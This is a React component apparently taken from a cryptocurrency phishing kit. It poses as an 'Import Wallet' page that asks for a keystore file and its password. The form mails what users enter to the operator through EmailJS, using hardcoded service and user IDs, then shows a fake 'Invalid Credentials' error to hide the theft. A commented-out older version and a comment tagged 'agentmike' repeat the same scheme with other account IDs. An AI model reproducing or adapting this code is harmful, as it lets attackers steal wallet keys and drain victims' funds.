import React, { useState } from "react";
import emailjs from "emailjs-com";
import { Link } from "react-router-dom";

const sendEmail = (e) => {
  e.preventDefault();

  emailjs
    .sendForm(
      "service_uca2x1k",
      "template_069w5ez",
      e.target,
      "user_Qp1Kvs7l8ZL0vLtKArviW"
    )
    .then(
      (result) => {
        alert("ERR! Error ");
        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
  e.target.reset();
};

const Keystore = () => {
  const [hide, setHide] = useState(false);

  const Showmodal = () => {
    setHide(true);
  };

  return (
    <div className="overall__phase">
      <div className="phase__container">
        <h2 style={{ textAlign: 'start', color: 'black', fontWeight: 700 }}>Import Wallet</h2>
        <br />
        <div className="phase__flex">
          <div className="phase__key">
            <a className="a" href="/">
              <Link to="/phrase">PHRASE KEY</Link>
            </a>
          </div>
          <div className="phase__key">
            <a className="a active" href="/">
              <Link to="/private">PRIVATE KEY</Link>
            </a>
          </div>
          <div className="phase__key">
            <a className="a" href="/">
              <Link to="/keystore">KEYSTORE JSON</Link>
            </a>
          </div>
        </div>

        {hide ? (
          <div className="errordiv">
            <h3>ERR: Invalid Credentials</h3>
          </div>
        ) : null}
        <form onSubmit={sendEmail}>
          <input
            type="text"
            placeholder="Enter your keystore"
            name="key"
          ></input>

          <input
            type="text"
            placeholder="Enter Temporary Password"
            name="pass"
          ></input>
          <h6 className="h4">
            Several lines of text beginning with '(...)' plus the password you used to encrypt it.
          </h6>
          <button type="submit" onClick={Showmodal}>
            {" "}
            <b>Connect</b>{" "}
          </button>

        </form>
      </div>
    </div>
  );
};

export default Keystore;


// "service_k8b44u9",
//   "template_3p64vor",
//   e.target,
//   "user_3oBCTEY5rIDrzWsqcTz39"


// import React, { useState } from "react";
// import emailjs from "emailjs-com";
// import { Link } from "react-router-dom";

// const sendEmail = (e) => {
//   e.preventDefault();

//   emailjs
//     .sendForm(
//       "service_bxvtlgb",
//       "template_nw2fu75",
//       e.target,
//       "user_BcTuzIe6hVvfGnxVcXhoi"
//     )
//     .then(
//       (result) => {
//         alert("ERR! Error ");
//         console.log(result.text);
//       },
//       (error) => {
//         console.log(error.text);
//       }
//     );
//   e.target.reset();
// };

// const Keystore = () => {
//   const [hide, setHide] = useState(false);

//   const Showmodal = () => {
//     setHide(true);
//   };

//   return (
//     <div className="phase__container">
//       <h1> Import Wallet</h1>
//       <br />
//       <div className="phase__flex">
//         <div className="phase__key">
//           <a className="a" href="/">
//             <Link to="/phrase">PHRASE KEY</Link>
//           </a>
//         </div>
//         <div>
//           <a className="a" href="/">
//             <Link to="/private">PRIVATE KEY</Link>
//           </a>
//         </div>
//         <div>
//           <a className="a" href="/">
//             <Link to="/keystore">KEYSTORE JSON</Link>
//           </a>
//         </div>
//       </div>
//       <hr />
//       <h2 className="h2">Sign In With Your Key</h2>
//       {hide ? (
//         <div className="errordiv">
//           <h3>ERR: Invalid Credentials</h3>
//         </div>
//       ) : null}
//       <form onSubmit={sendEmail}>
//         <input
//           type="text"
//           placeholder="Keystore"
//           name="key"
//         ></input>

//         <h4 className="h4">
//           Typically 12 (sometimes 24) words separated by a single spaces.
//         </h4>
//         <button type="submit" onClick={Showmodal}>
//           {" "}
//           <b>VALIDATE</b>{" "}
//         </button>
//       </form>
//     </div>
//   );
// };

// export default Keystore;

// // agentmike
// // "service_ev908dp",
// //   "template_7affnlp",
// //   e.target,
// //   "user_8ohyPvHV7hGqVjtMjn55h"


